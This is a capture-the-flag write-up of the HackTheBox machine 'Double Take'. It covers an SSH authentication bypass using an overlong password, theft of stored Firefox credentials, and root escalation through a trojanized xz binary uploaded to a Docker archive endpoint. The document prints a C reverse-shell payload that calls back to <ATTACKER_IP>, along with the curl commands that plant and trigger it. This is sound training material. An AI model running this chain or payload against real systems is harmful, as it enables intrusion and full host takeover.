# 🛡️ HackTheBox: Double Take - Write-up

* **Platform:** HackTheBox
* **Machine:** Double Take
* **Difficulty:** Easy
* **Author:** HERO 🦸‍♂️

---

## 🎯 Executive Summary
In this write-up, we exploit two highly interesting vulnerabilities to fully compromise the "Double Take" machine. The initial foothold is achieved by bypassing SSH authentication using a known flaw in the `musl` library's `crypt()` function (CVE-2026-123158). After breaking out of the initial restricted container environment and harvesting credentials, we pivot to the Zentara CMS web interface. Finally, we escalate privileges to `root` by exploiting a binary resolution flaw in Docker's archive extraction process (CVE-2026-41567) using a custom trojanized `xz` binary.

---

## 🔍 1. Reconnaissance & Enumeration

### Port Scanning
We initiate our enumeration with a full-port fast scan, followed by a detailed service scan:

```bash
nmap -p- --min-rate 5000 <TARGET_IP>
nmap -sC -sV -p 22,80 <TARGET_IP>

The scan reveals two open ports:

    Port 22 (SSH): OpenSSH 10.6p1

    Port 80 (HTTP): Web Server (Requires credentials)

Since the HTTP service is locked behind a login prompt, we turn our attention to the SSH version. Researching OpenSSH 10.6p1 operating in specific environments reveals it is vulnerable to CVE-2026-123158 (SSHole).
Understanding CVE-2026-123158

The vulnerability originates in the musl libc library's crypt() function. When an attacker attempts to log in with an exceptionally long password (between 257 and 1024 characters), the function errors out and returns a *. In /etc/shadow, a * denotes an account that authenticates via SSH keys without a password. However, due to this flaw, the SSH daemon misinterprets the * return value, assuming the attacker provided a valid password for password-less accounts (like alpine).

🔓 2. Initial Foothold

To exploit this, we simply need to generate a password exceeding 256 characters and use it to authenticate as the alpine user.

Generate a 300-character string using Python:
  python3 -c "print('A' * 300)"
Attempt SSH login using the generated string as the password:
  ssh alpine@<TARGET_IP>
# When prompted, paste the 300 'A's.
Boom we are in!.

🕵️‍♂️ 3. Lateral Movement & Credential Harvesting

Upon accessing the system, a quick enumeration (cat /etc/os-release) reveals we are trapped inside an Alpine Docker container.

To progress, we dig through the user's home directory and discover a Firefox profile containing stored credentials:
  cat /home/alpine/.mozilla/firefox/zentara.default/logins.json

We extract the Base64-encoded credentials for a user named bob. Using these credentials, we secure the user.txt flag. That's 50% of the machine completed!

🚀 4. Privilege Escalation (CVE-2026-41567)

Armed with bob's credentials, we authenticate to the HTTP page (Port 80) and gain access to the Zentara CMS. Enumerating the CMS environment reveals the backend is running Docker 29.5.0.
Understanding CVE-2026-41567

Docker versions up to 29.5.0 suffer from a binary resolution flaw in the PUT /containers/{id}/archive API endpoint. When the daemon receives a compressed archive, it resolves the decompression binaries (like xz or unpigz) from the container's overlay filesystem instead of the host's filesystem.

If we replace the container's /usr/bin/xz with a malicious binary and upload a .tar.xz file via the Zentara "Deploy" page (which forwards to this exact endpoint), the Docker daemon will execute our trojanized binary as the host root with full capabilities (CAP_SYS_ADMIN).
Staging the Payload

We write a C program to escape the namespace, mount the host's proc filesystem, and spawn a reverse shell:
   // save as test.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1", NULL);
    return 1;
}

We compile it statically and package it into a .tar archive to overwrite the container's /usr/bin/xz tool:
gcc -static -o xz test.c 
mkdir -p test/usr/bin
cp xz test/usr/bin/xz
cd test
tar cf ../plant.tar usr/bin/xz
cd ..

Triggering the Exploit

First, we upload plant.tar via the Zentara deploy API to overwrite the binary:
curl -u bob:CorrectHorseBatteryStaple \
-F 'archive=@plant.tar' \
-F 'workspace=/' \
http://<TARGET_IP>/deploy

Next, we set up our listener on our Kali machine:
  penelope -i tun0 -p 4444 -O

Finally, we create a valid .xz archive and upload it to force the daemon to call our trojanized xz binary:
  echo x > t 
tar cf - t | xz > trigger.tar.xz

curl -u bob:CorrectHorseBatteryStaple \
-F 'archive=@trigger.tar.xz' \
-F 'workspace=/workspace' \
http://<TARGET_IP>/deploy

Check the listener... Boom! We have a root shell on the host! 🎉

Pwned by HERO 💀🔥
